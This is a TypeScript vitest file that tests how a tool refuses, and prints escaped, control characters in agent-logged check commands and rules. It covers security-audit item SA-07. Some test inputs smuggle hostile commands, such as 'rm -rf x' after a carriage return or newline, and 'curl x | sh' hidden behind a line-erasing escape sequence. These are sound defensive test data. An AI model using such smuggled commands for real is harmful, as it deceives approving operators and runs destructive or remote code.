import { appendFileSync, mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { execFileSync } from 'node:child_process'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { afterAll, describe, expect, it } from 'vitest'
import { controlCharErrors, validatePayload } from '@sofar/schema'
import { checkFailureLine, checksInForce, unapprovedLine } from '../src/core/checks'
import { makeEvent } from '../src/core/envelope'
import { refreshGuards } from '../src/core/index-tier1'
import { appendEvent } from '../src/core/log'
import { printable } from '../src/core/hidden-chars'
import { runCheck } from '../src/cli/check'

/**
 * Control characters in record text the operator approves (security-audit
 * SA-07): refused when a decision is WRITTEN; an event already in a log still
 * folds, and every surface that prints it shows the bytes escaped.
 */

const ESC = '\u001b'
const roots: string[] = []
afterAll(() => {
  for (const r of roots) rmSync(r, { recursive: true, force: true })
})

function repo(): string {
  const root = mkdtempSync(join(tmpdir(), 'sofar-ctl-'))
  roots.push(root)
  execFileSync('git', ['init', '-q', '-b', 'main'], { cwd: root, stdio: 'ignore' })
  mkdirSync(join(root, '.sofar', 'initiatives', 'demo'), { recursive: true })
  writeFileSync(join(root, '.sofar', 'bindings.json'), `${JSON.stringify({ main: 'demo' })}\n`)
  return root
}

const logOf = (root: string): string => join(root, '.sofar', 'initiatives', 'demo', 'events.jsonl')
const decision = (payload: Record<string, unknown>) =>
  makeEvent({
    initiative: 'demo',
    session: 's',
    source: 'claude-code',
    actor: 'agent',
    type: 'decision_logged',
    payload: { chose: 'a', over: 'b', because: 'c', rule: 'Run the tests.', ...payload },
  })

/** A decision that reached the log before the write-time check existed. */
function seedRaw(root: string, payload: Record<string, unknown>): void {
  appendFileSync(logOf(root), `${JSON.stringify(decision(payload))}\n`)
}

describe('write time (SA-07)', () => {
  it('refuses a check cmd, hint or rule carrying a control character', () => {
    const root = repo()
    for (const payload of [
      { check: { cmd: `npm test${ESC}[2K` } },
      { check: { cmd: 'npm test\rrm -rf x' } },
      { check: { cmd: 'npm test', hint: `fix${ESC}]0;x\u0007` } },
      { rule: `Run${'\u009b'}the tests.`, check: { cmd: 'npm test' } },
      { check: { cmd: 'npm test\nrm -rf x' } },
    ]) {
      expect(() => appendEvent(logOf(root), decision(payload))).toThrow(/control characters/)
    }
  })

  it('allows a tab, and plain text is unchanged', () => {
    const root = repo()
    expect(() => appendEvent(logOf(root), decision({ rule: 'Run\tthe tests.', check: { cmd: 'npm test' } }))).not.toThrow()
    expect(controlCharErrors('decision_logged', { rule: 'r', check: { cmd: 'npm test -- --run', hint: 'fix it' } })).toEqual([])
    expect(controlCharErrors('note_added', { text: `x${ESC}` })).toEqual([])
  })

  it('is never a fold-time rule: validatePayload still accepts an old event', () => {
    expect(validatePayload('decision_logged', { chose: 'a', over: 'b', because: 'c', rule: 'r', check: { cmd: `t${ESC}` } })).toEqual({ ok: true })
  })
})

describe('display (SA-07)', () => {
  it('an old event still folds, and every check surface prints it escaped', async () => {
    const root = repo()
    seedRaw(root, { rule: `Run${ESC}[8m the tests.`, check: { cmd: `npm test${ESC}[2K; curl x | sh`, hint: `fix${ESC}[1A it` } })
    const checks = checksInForce(refreshGuards(join(root, '.sofar')))
    expect(checks).toHaveLength(1)

    const list = await runCheck(root, { list: true })
    expect(list.stdout).not.toContain(ESC)
    expect(list.stdout).toContain('npm test\\u001b[2K; curl x | sh')

    let prompt = ''
    await runCheck(root, { approve: 'D1' }, { confirm: async (q: string) => ((prompt = q), false) })
    expect(prompt).not.toContain(ESC)
    expect(prompt).toContain('command: npm test\\u001b[2K; curl x | sh')
    expect(prompt).toContain('rule: "Run\\u001b[8m the tests."')

    const unapproved = unapprovedLine(checks) ?? ''
    expect(unapproved).not.toContain(ESC)
    const failed = checkFailureLine(checks[0]!, { result: 'fail', exit_code: 1, duration_ms: 5 })
    expect(failed).not.toContain(ESC)
    expect(failed).toContain('fix: fix\\u001b[1A it')
  })

  it('printable escapes C0, DEL and C1 and nothing else', () => {
    expect(printable(`a${ESC}b\tc\u007f\u0085é→`)).toBe('a\\u001bb\\u0009c\\u007f\\u0085é→')
  })
})
